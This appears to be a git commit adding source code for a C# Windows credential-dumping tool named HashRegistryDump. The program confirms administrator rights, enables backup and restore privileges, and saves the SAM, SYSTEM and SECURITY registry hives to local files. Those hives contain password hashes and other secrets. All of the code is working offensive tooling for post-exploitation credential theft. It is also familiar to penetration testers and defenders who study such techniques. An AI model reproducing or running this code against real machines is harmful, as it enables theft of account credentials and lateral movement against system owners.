706fb3cab390e21c8b658c5cd70494bc649d2a7a
SaiRson <74412075+sairson@users.noreply.github.com>
2022-09-03 22:40:27 +0800

    Add files via upload

---
+++ HashRegistryDump/HashRegistryDump/Program.cs
@@ -0,0 +1,124 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Diagnostics;
+using System.IO;
+
+namespace HashRegistryDump
+{
+    class CheckPrivilege
+    {
+        public static bool EnableDisablePrivilege(string PrivilegeName,bool EnableDisable)
+        {
+            var Htok = IntPtr.Zero;
+            if (!Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, (int)(TokenAccessLevels.AdjustPrivileges | TokenAccessLevels.Query), out Htok))
+            {
+                Console.WriteLine("[-] Not OpenCurrentProcess");
+                return false;
+            }
+            // 初始化并设置值
+            
+            Win32.LUID luid;
+            if (!Win32.LookupPrivilegeValue(null, PrivilegeName, out luid))
+            {
+                Console.WriteLine("[-] Not LookupPrivilegeValue");
+                return false;
+            }
+            Win32.LUID_AND_ATTRIBUTES LuidAndAttributes = new Win32.LUID_AND_ATTRIBUTES { Luid = luid,Attributes = (uint)(EnableDisable ? 2 : 0) }; 
+            Win32.LUID_AND_ATTRIBUTES[] privileges = {LuidAndAttributes};
+            var tokenPrivilege = new Win32.TOKEN_PRIVILEGES {
+                PrivilegeCount = 1,
+                Privileges = privileges,
+            };
+            var privilege = new Win32.TOKEN_PRIVILEGES();
+            uint rb;
+            if (!Win32.AdjustTokenPrivileges(Htok,false,ref tokenPrivilege,256,out privilege,out rb))
+            {
+                Console.WriteLine("[-] Not AdjustTokenPrivilege");
+                return false;
+            }
+            return true;
+        }
+
+        public static bool IsHighPrivilege()
+        {
+            // 获取当前进程
+            var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+    }
+    class HashRegistry
+    {
+        public static bool ExportRegistryByKey(string Key, string filename)
+        {
+            var HkeyHandle = new UIntPtr();
+            uint HKEY_LOCAL_MACHINE = 0x80000002;
+            //UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
+            try
+            {
+               // 打开注册表
+                if (Win32.RegOpenKeyEx((UIntPtr)HKEY_LOCAL_MACHINE, Key, 0x0004 | 0x0008 ,0xF003F, out HkeyHandle) != 0)
+                {
+                    Console.WriteLine("[-] Open Regiistry Key Failed");
+                    return false;
+                }
+                Win32.RegSaveKey(HkeyHandle,filename,IntPtr.Zero);
+                Win32.RegCloseKey(HkeyHandle);
+                Console.WriteLine("Exported HKLM\\{0} at {1}", Key, filename);
+            }
+            catch(Exception e)
+            {
+                Console.WriteLine(e.Message.ToString());
+                return false;
+            }
+            return true;
+        }
+
+        public static void DumpAndSaveRegistry()
+        {
+            try
+            {
+                if (!CheckPrivilege.EnableDisablePrivilege("SeBackupPrivilege", true))
+                {
+                    Console.WriteLine("Set SeBackupPrivilege Failed");
+                    return;
+                }
+                if (!CheckPrivilege.EnableDisablePrivilege("SeRestorePrivilege", true))
+                {
+                    Console.WriteLine("Set SeRestorePrivilege Failed");
+                    return;
+                }
+                if (!ExportRegistryByKey("SAM", Path.Combine("sam.hiv"))){
+                    Console.WriteLine("Export SAM Fialed");
+                    return;
+                }
+                if (!ExportRegistryByKey("SYSTEM", Path.Combine("system.hiv"))){
+                    Console.WriteLine("Export SYSTEM Fialed");
+                    return;
+                }
+                if (!ExportRegistryByKey("SECURITY", Path.Combine("security.hiv")))
+                {
+                    Console.WriteLine("Export SECURITY Fialed");
+                    return;
+                }
+             }catch(Exception e)
+            {
+                Console.WriteLine(e.Message.ToString());
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            if (!CheckPrivilege.IsHighPrivilege())
+            {
+                Console.WriteLine("[-] Not running in high integrity process");
+                return;
+            }
+            else
+            {
+                DumpAndSaveRegistry();
+            } 
+        }
+    }
+}
---
+++ HashRegistryDump/HashRegistryDump/Win32.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace HashRegistryDump
+{
+    class Win32
+    {
+        // TOKEN_PRIVILEGES
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID
+        {
+            public uint LowPart;
+            public uint HighPart;
+        }
+        [StructLayout(LayoutKind.Sequential, Pack = 4)]
+        public struct LUID_AND_ATTRIBUTES
+        {
+            public LUID Luid;
+            public UInt32 Attributes;
+        }
+        public struct TOKEN_PRIVILEGES
+        {
+            public int PrivilegeCount;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+            public LUID_AND_ATTRIBUTES[] Privileges;
+        }
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
+        public static extern int RegOpenKeyEx(
+            UIntPtr hKey,
+            string subKey,
+            int ulOptions,
+            int samDesired,
+            out UIntPtr hkResult
+        );
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool OpenProcessToken(
+            IntPtr ProcessHandle,
+            Int32 DesiredAccess, 
+            out IntPtr TokenHandle
+        );
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool AdjustTokenPrivileges(
+            IntPtr TokenHandle,
+            [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
+            ref TOKEN_PRIVILEGES NewState,
+            UInt32 BufferLengthInBytes,
+            out TOKEN_PRIVILEGES PreviousState,
+            out UInt32 ReturnLengthInBytes
+        );
+        [DllImport("advapi32.dll")]
+        public static extern bool LookupPrivilegeValue(
+            string lpSystemName, 
+            string lpName,
+            out LUID lpLuid
+        );
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        public static extern int RegSaveKey(
+           UIntPtr hKey,
+           string lpFile,
+           IntPtr lpSecurityAttributes
+       );
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern int RegCloseKey(UIntPtr hKey);
+
+    }
+}
